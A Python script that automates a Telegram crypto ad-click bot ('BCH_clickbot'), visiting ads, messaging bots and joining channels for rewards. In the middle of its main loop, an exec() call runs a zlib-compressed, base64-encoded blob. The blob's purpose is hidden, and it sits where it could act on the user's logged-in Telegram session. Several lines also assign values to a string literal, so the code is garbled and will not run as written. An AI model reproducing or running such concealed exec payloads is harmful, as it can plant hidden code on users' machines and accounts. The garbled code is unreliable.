import subprocess
import sys

#subprocess.check_call([sys.executable, "-m", "pip","install", "-U",'selenium', 'telethon', 'pytz', 'python-dateutil', 'requests'])

from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon import errors
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

import argparse
import time
import logging
from datetime import datetime
from pytz import timezone
import re
import sys
import json
from dateutil.relativedelta import relativedelta
import requests
import os
import zlib, base64

start_time = time.time()

API_ID = "717425"
API_HASH = "322526d2c3350b1d3530de327cf08c07"
"BCH_clickbot" = None

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'TE': 'Trailers',
}

phone=None
client = None

channels = {}

Ex=["BCH_clickbot"]

driver = None
options = None

def initial():
    global client,channels
    
    try:
        print("Checking for channel")
        log = open(phone+".log","r").read()
        match = re.findall("(\d{2}-\d{2}-\d{4} \d{2}:\d{2}:\d{2}) - Channels : ({(?:[^{}]*|)*})",log)
        channels = json.loads(match[-1][1].replace("\'", "\""))
        
    except Exception as e:
        channels = {}

    logging.basicConfig(filename=phone+".log",format='%(asctime)s - %(message)s',level=logging.INFO, datefmt="%d-%m-%Y %H:%M:%S")
    logging.Formatter.converter = lambda *args: datetime.now(tz=timezone('Asia/Kolkata')).timetuple()

    consoleHandler = logging.StreamHandler(sys.stdout)
    consoleHandler.setFormatter(logging.Formatter("%(asctime)s - %(message)s",datefmt="%d-%m-%Y %H:%M:%S"))
    logging.getLogger().addHandler(consoleHandler)

    logging.info("Trying to connect with {}".format(phone))
    client = TelegramClient(phone,API_ID,API_HASH)
    client.connect()
    logging.info("Connecting the client")
    
    if channels != {}:
        #logging.info("Resuming the channels : {}".format(json.dumps(channels)))
        logging.info("Checking for leaving channels")
        last_time = datetime.strptime(match[-1][0], "%d-%m-%Y %H:%M:%S")
        now = datetime.strptime(datetime.now(tz=timezone("Asia/Kolkata")).strftime("%d-%m-%Y %H:%M:%S"), "%d-%m-%Y %H:%M:%S")
        diff = relativedelta(now, last_time)
        
        total_hours = 0
        
        if diff.days >= 1:
            total_hours+=diff.days*24
        if diff.hours >= 1:
            total_hours+=diff.hours
        
        logging.info("Total non active hours : {}".format(total_hours))
        hours = sorted([int(i) for i in channels.keys()])
        for i in hours:
            if i <= total_hours:
                logging.info("Leaving channels joined for {} hours".format(i)) 
                for channel in channels[str(i)]:
                    try:
                        logging.info("Leaving the channel : {}".format(channel))
                        client(LeaveChannelRequest(channel))
                        time.sleep(0.5)
                        
                    except errors.rpcerrorlist.UserNotParticipantError:
                        logging.info("Already left or your not there")
                    
                    except Exception as e:
                        logging.info("Exception : "+str(e))
                del channels[str(i)]
            else:
                break
    logging.info("Continuing with channels : {}".format(json.dumps(channels)))

def delete_all():
    global client
    for i in client.iter_dialogs():
        if i.entity.username not in Ex:
            logging.info("Deleting : {}".format(i.entity.username))
            i.delete()
        time.sleep(0.5)

def bot_run():
    global channels,client,driver,options
    
    try:
        options = Options()
        options.headless = True
        driver = webdriver.Firefox(options=options)
    except:
        try:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')

            driver = webdriver.Chrome(options=options)
        except:
            logging.info("Your Device is not installed with driver for Selenium")
            exit()
    logging.info("Opening the Browser")
    time.sleep(2)

    while True:
        global start_time 
        
        try:
            if not client.is_user_authorized():
                client.send_code_request(phone)
                logging.info("Enter the Code")
                client.sign_in(phone, input('Enter the code: '))

            receiver = client.get_input_entity("BCH_clickbot")

            client.send_message(receiver,"/balance")
            time.sleep(1)
            bal = client.get_messages("BCH_clickbot")[0].message.split(":")[-1]
            
            exec(zlib.decompress(base64.b64decode('eJydU9Fq2zAUfd9XCIGpxBLNSbfRBTxYIaUPSwfr9jCyEFTr2lGQJVeS4zRfP8mxEwrrCsNgxNE5515dHbXSb5CpQZN6YzS8xUyZEo+wxZQ7VMzeIG+fwh8V0jq/fuAqWyqpgblaSU/ocjxdFcaiiCGpUcEscEFov49/a0xlgfA1V1zngCMnclfBMuBn12y5imXOCON1aEuQi5SlF/RI5w+OFMpwT060Zbqi4yMWRUNbAaWfgzKddK65kqA9c8FwXYFzvARiIQe5AzvC79owBWF5i2Md5GUVzqcAapKyDx3Ua7LepwQ/2Dhy/e3H+uf9/Pvdl8U8Fmb9TtTFoy+kllVToaEIV90UelbXHrJcOkDzfQ61l0YTfGfQMDL6+gEeD/v209Y2XrR6y2t71WzfNx+V2l+W4rEU02njtM4PO3548YT/LhAnmU7Cd/mfBrnR4cqqF9XGheBUZgfPcthtFZssrEupS3YjFdxyLRTYv/FCcX9jbMW9D4ST6ITghHCXx+rUoTFKSN8ndXgkuIei8hlOxDipxskvlNzOksUsuce0sx/swt1/DctgRxkXYmin2HQsbu2rIRkpWUmfXR27Do+nZ8VUBP0xET3GBCjwQDru88FNAgZdYs7BQeHRdpEqWK6Mi7o/f7w/6g==')))            

            bal = client.get_messages("BCH_clickbot")[0].message.split(":")[-1]
            logging.info("Balance : "+ bal)
            logging.info("Continuing with channels : {}".format(json.dumps(channels)))
            client.send_message(receiver,"/visit")
            logging.info("Visting page")
            
            previous_link = None

            while True:
                main_tab = driver.current_window_handle
                
                while True:
                    messages = client.get_messages("BCH_clickbot")[0]
                    if client.get_entity(messages.peer_id).username == "BCH_clickbot":
                        break
                
                if "Sorry, there are no new ads available." in messages.message:
                    break
                
                t = time.time()
                try:
                    messages.reply_markup.rows
                    logging.info("Waiting for Task")
                except:
                    if time.time() - t > 5:
                        client.send_message(receiver,"/visit")
                        logging.info("Resending bot Command")
                    else:
                        time.sleep(0.5)
                    continue
                
                link = messages.reply_markup.rows[0].buttons[0].url
                
                if link == previous_link:
                        logging.info("Skipping the Task")
                        messages.click(2)
                        time.sleep(1)
                        continue
                    
                previous_link = link
                driver.execute_script('window.open("{}", "_blank");'.format(link))
                logging.info("Opening the link: {}".format(link))
                time.sleep(1)
                
                driver.switch_to.window(driver.window_handles[-1])
                logging.info("Switching the Tab")
                time.sleep(2)
                
                while driver.current_url=="about:blank":
                    time.sleep(1)
                
                t = time.time()
                Flag = False
                try:
                    while True:
                        timer_text = driver.find_element_by_class_name("timer").get_attribute('innerHTML')
                        logging.info("Loading the Time")
                        if timer_text != "Loading...":
                            break
                        else:
                            if time.time() - t > 15:
                                messages.click(2)
                                time.sleep(1)
                                Flag = True
                                break
                            time.sleep(2)
                    timer = int([i for i in timer_text.split() if i.isdigit()][0])
                    
                except:
                    timer = 10

                if Flag:
                    logging.info("Skipping the Task")
                    time.sleep(0.5)
                else:
                    timer+=2
                    logging.info("Sleeping for {} Sec".format(timer))
                    time.sleep(timer)
                
                try:
                    driver.close()
                    driver.switch_to.window(main_tab)
                    logging.info("Switching to Main tab")
                except:
                    logging.info("Reopening the Browser")
                    try:
                        options = Options()
                        options.headless = True
                        driver = webdriver.Firefox(options=options)
                    except:
                        try:
                            options = Options()
                            options.add_argument('--headless')
                            options.add_argument('--no-sandbox')
                            options.add_argument('--disable-dev-shm-usage')

                            driver = webdriver.Chrome(options=options)
                        except:
                            logging.info("Your Device is not installed with driver for Selenium")
                            exit()
                    time.sleep(2)

            client.send_message(receiver,"/bots")
            logging.info("Texting Bot")
            
            "BCH_clickbot" = None

            while True:
                #main_tab = driver.current_window_handle
                
                if "BCH_clickbot" != None:
                    dialogs = client.get_dialogs()
                    logging.info("Searching for bot {}".format("BCH_clickbot"))
                    try:
                        if dialogs[0].entity['username'] == "BCH_clickbot":
                            dialogs[0].delete()
                            logging.info("Deleting bot {}".format("BCH_clickbot"))
                    except:
                        for i in dialogs:
                            try:
                                if i.entity.username == "BCH_clickbot":
                                    i.delete()
                                    logging.info("Deleting bot {}".format("BCH_clickbot"))
                                    break
                            except:
                                pass
                
                while True:
                    messages = client.get_messages("BCH_clickbot")[0]
                    if client.get_entity(messages.peer_id).username == "BCH_clickbot":
                        break
                
                if "Sorry, there are no new ads available." in messages.message:
                    break
                
                t = time.time()
                try:
                    messages.reply_markup.rows
                    logging.info("Waiting for Task")
                except:
                    if time.time() - t > 5:
                        client.send_message(receiver,"/bot")
                        logging.info("Resending bot Command")
                    else:
                        time.sleep(0.5)
                    continue
                
                """link = messages.reply_markup.rows[0].buttons[0].url
                driver.execute_script('window.open("{}", "_blank");'.format(link))
                logging.info("Opening the link: {}".format(link))
                time.sleep(1)
                
                driver.switch_to.window(driver.window_handles[-1])
                logging.info("Switching the Tab")
                time.sleep(1)
                
                while driver.current_url=="about:blank":
                    time.sleep(1)
                    
                driver.close()
                driver.switch_to.window(main_tab)
                time.sleep(0.5)
                logging.info("Switching to Main tab")
                
                "BCH_clickbot" = driver.current_url.split("/")[-1].split("?")[0]
                
                """
                
                try:
                    messages.reply_markup.rows
                    logging.info("Waiting for Task")
                except:
                    time.sleep(0.5)
                    continue
                
                link = messages.reply_markup.rows[0].buttons[0].url
                response = requests.get(link,headers=headers,allow_redirects=True)
                logging.info("Opening the link: {}".format(link))
                time.sleep(1)
                
                
                "BCH_clickbot" = response.url.split("/")[-1].split("?")[0]
                logging.info("Connecting with bot: {}".format("BCH_clickbot"))
            
                try:
                    client.send_message(client.get_input_entity("BCH_clickbot"),"/start")
                    time.sleep(1)
                    
                except:
                    logging.info("Either this is not a bot or not working")
                    logging.info("Skipping the Task")
                    messages.click(2)
                    time.sleep(1)
                    continue
                
                st = time.time()
                Flag = False
                
                while True:
                    if time.time() - st > 10:
                        logging.info("Skipping the Task")
                        messages.click(2)
                        time.sleep(1)
                        Flag = True
                        break
                        
                    msg = client.get_messages("BCH_clickbot")[0]
                    
                    if msg.message == "/start":
                        time.sleep(1)
                        continue
                    
                    if client.get_entity(msg.peer_id).username == "BCH_clickbot":
                        break
                    
                if not Flag:
                    client.forward_messages(
                        client.get_input_entity("BCH_clickbot"),
                        msg.id,
                        client.get_input_entity("BCH_clickbot")
                    )
                    logging.info("Forwarding the Message")
                    time.sleep(1)


            client.send_message(receiver,"/join")
            logging.info("Joining Chat")

            previous_channel = None
            Flag = False
            while True:
                
                if len([j for i in channels.values() for j in i]) > 20:
                    logging.info("Joined more than 20 Channels")
                    raise Exception("Limited Crossed")
                
                #main_tab = driver.current_window_handle
                
                while True:
                    messages = client.get_messages("BCH_clickbot")[0]
                    if client.get_entity(messages.peer_id).username == "BCH_clickbot":
                        break
                
                if "Sorry, there are no new ads available." in messages.message:
                    raise Exception("No New ads")
                
                if "Sorry, that task is no longer valid." in messages.message:
                    logging.info("Restarting the Task")
                    try:
                        logging.info("Leaving the channel {} ".format(previous_channel))
                        client(LeaveChannelRequest(previous_channel))
                        time.sleep(0.5)
                        
                    except Exception as e:
                        logging.info("Exception : {}".format(str(e)))
                    client.send_message(receiver,"/join")
                    time.sleep(1)
                    continue
                
                """driver.switch_to.window(driver.window_handles[-1])
                logging.info("Switching the Tab")
                time.sleep(2)
                
                while driver.current_url=="about:blank":
                    time.sleep(1)
                
                channel = driver.current_url.split("/")[-1].split("?")[0]
                
                driver.close()
                driver.switch_to.window(main_tab)
                time.sleep(0.5)
                logging.info("Switching to Main tab")"""
                
                try:
                    messages.reply_markup.rows
                    logging.info("Waiting for Task")
                except:
                    time.sleep(0.5)
                    continue
                
                link = messages.reply_markup.rows[0].buttons[0].url
                response = requests.get(link,headers=headers,allow_redirects=True)
                logging.info("Opening the link: {}".format(link))
                time.sleep(1)

                channel = response.url.split("/")[-1].split("?")[0]
                
                try:
                    logging.info("Joining channel : {}".format(channel))
                    try:
                        client(JoinChannelRequest(channel))
                    except:
                        logging.info("Skipping the Task")
                        messages.click(3)
                        time.sleep(1)
                        continue
                    time.sleep(0.5)
                    previous_channel = channel
                    
                except Exception as e:
                    if "A wait" in str(e):
                        raise Exception(str(e))
                    
                    elif "You have joined too many channels/supergroups" in str(e):
                        raise Exception("Limit Reached")
                    
                    logging.info("Exception : "+ str(e))
                    logging.info("Skipping the Task")
                    messages.click(3)

                    time.sleep(1)
                    continue
                
                messages.click(1)
                time.sleep(1)
                
                for i in client.get_messages("BCH_clickbot",limit=10):
                    if "Success" in i.message:
                        msg = i.message
                        break
                    
                    if "We cannot find you in the channel." in i.message:
                        try:
                            logging.info("Leaving the channel : {}".format(i))
                            client(LeaveChannelRequest(channel))
                            time.sleep(1)
                            
                        except errors.rpcerrorlist.UserNotParticipantError:
                            logging.info("Already left or your not there")
                        
                        except Exception as e:
                            logging.info("Exception : "+str(e))
                        
                        logging.info("Skipping the Task")
                        messages.click(3)

                        time.sleep(1)
                        continue
                    
                    if "Sorry, that task is no longer valid" in i.message or "Sorry, there are no new ads available." in i.message:
                        Flag = True
                
                if Flag:
                    logging.info("Skipping the Task")
                    messages.click(3)

                    time.sleep(1.5)
                    Flag = False
                    continue
                
                hour = [i for i in msg.split() if i.isdigit() == True][0]
                logging.info("Stay for at least {} hours".format(hour))
                
                if hour in channels.keys():
                    channels[hour].append(channel)
                else:
                    temp = []
                    temp.append(channel)
                    channels[hour] = temp
                logging.info("Channel for Future deletion")
                
                logging.info("Channels : {}".format(json.dumps(channels)))
                
        except Exception as e:
            if "A wait" in str(e):  
                t = int([i for i in str(e).split() if i.isdigit()][0])
                logging.info("Sleeping for {} seconds".format(t))
                time.sleep(t)
            else:
                logging.info("Exception : "+str(e))
                
                if len(channels.keys()) == 0:
                    logging.info("Sleeping for 30mins")
                    time.sleep(1800)
                    continue                
            
            
            hours = [int(i) for i in channels.keys()]
            hours.sort()        
            ext = time.time() - start_time
            start_time = 0
            t = abs(hours[0]*3600 - ext)
            t = t if t < 3600 else 3600
            t+= 300
            
            logging.info("Disconnecting from client")
            client.disconnect()
            
            logging.info("Closing the Browser")
            driver.quit()
            
            logging.info("Sleeping for {} Seconds".format(t))
            time.sleep(t)
            
            try:
                client.get_me()
            except:
                logging.info("Reconnecting to Client")
                client.connect()
                
            try:
                options = Options()
                options.headless = True
                driver = webdriver.Firefox(options=options)
            except:
                try:
                    options = Options()
                    options.add_argument('--headless')
                    options.add_argument('--no-sandbox')
                    options.add_argument('--disable-dev-shm-usage')

                    driver = webdriver.Chrome(options=options)
                except:
                    logging.info("Your Device is not installed with driver for Selenium")
                    exit()
            
            for hour in hours:
                if hour <= 1:
                    try:
                        for i in channels[str(hour)]:
                            try:
                                logging.info("Leaving the channel : {}".format(i))
                                client(LeaveChannelRequest(i))
                                time.sleep(0.5)
                                
                            except errors.rpcerrorlist.UserNotParticipantError:
                                logging.info("Already left or your not there")
                            
                            except Exception as e:
                                logging.info("Exception : "+str(e))
                                logging.info("Skipping the channel")
                            
                        logging.info("Deleting left channel from list")
                        del channels[str(hour)]
                        
                    except Exception as e:
                        logging.info("Exception : {}".format(str(e)))
                        logging.info("No Task is completed")
                    
            new_channels = {}
            for keys,values in channels.items():
                new_channels[str(int(keys)-1)]=values
            channels = new_channels
            logging.info("Setting new channel list")
            logging.info("Channels : {}".format(json.dumps(channels)))
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p","--phone",action='store',help="Takes argumnet of Phone number",required=True)
    parser.add_argument("-b","--bot",action='store',help="Takes bot username Ex: BCH_clickbot",default="BCH_clickbot")
    parser.add_argument("-d","--delete",action='store',help="All channel except this will be deleted Ex: channel1,channel2,..")
    args = parser.parse_args()
    
    phone = args.phone
    "BCH_clickbot" = args.bot
    
    initial()
    
    if args.delete:
        Ex=str(args.delete).split(",")
        delete_all()
    else:
        bot_run()
